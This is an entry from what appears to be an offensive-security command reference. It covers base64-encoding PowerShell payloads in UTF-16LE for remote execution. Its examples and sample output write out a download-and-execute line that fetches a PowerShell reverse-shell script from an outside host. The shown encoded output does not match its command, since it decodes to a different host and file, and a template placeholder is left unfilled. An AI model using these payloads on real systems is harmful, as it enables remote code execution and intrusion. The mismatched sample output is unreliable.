---
id: d30cf702-d601-49aa-bad5-c45911a03fc0
name: iconv-encode-string-utf16-base64
type: command
executor: bash
data: echo -n "$_PAYLOAD" | iconv -t utf-16le | base64 -w 0
output: >-
  root@kali:~# echo -n "iex (New-Object
  Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
  | iconv -t utf-16le | base64 -w 0

  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
created_at: '2019-11-13T23:32:45.203382+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - encode
  - base64
verified: true
validated: true
---

# iconv-encode-string-utf16-base64

## Command

```bash
echo -n "$_PAYLOAD" | iconv -t utf-16le | base64 -w 0
```

## Description

This command encodes a PowerShell payload string to Base64 after converting it to UTF-16LE encoding, ensuring compatibility with Windows PowerShell's string handling when executed remotely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD | The PowerShell command or script string to encode | Yes |
| -n | Suppress trailing newline in echo | Built-in |
| -t utf-16le | Convert input to UTF-16 little-endian | Built-in |
| -w 0 | Disable line wrapping in base64 output | Built-in |

## Examples

### Basic Usage

```bash
echo -n "Get-Process" | iconv -t utf-16le | base64 -w 0
```

### Advanced Usage

```bash
echo -n "iex (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')" | iconv -t utf-16le | base64 -w 0
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
root@kali:~# echo -n "iex (New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```

## Related

- [[procedures/Encode-and-Execute-Base64-PowerShell-Command]]
- [[commands/powershell-base64-encode-string]]
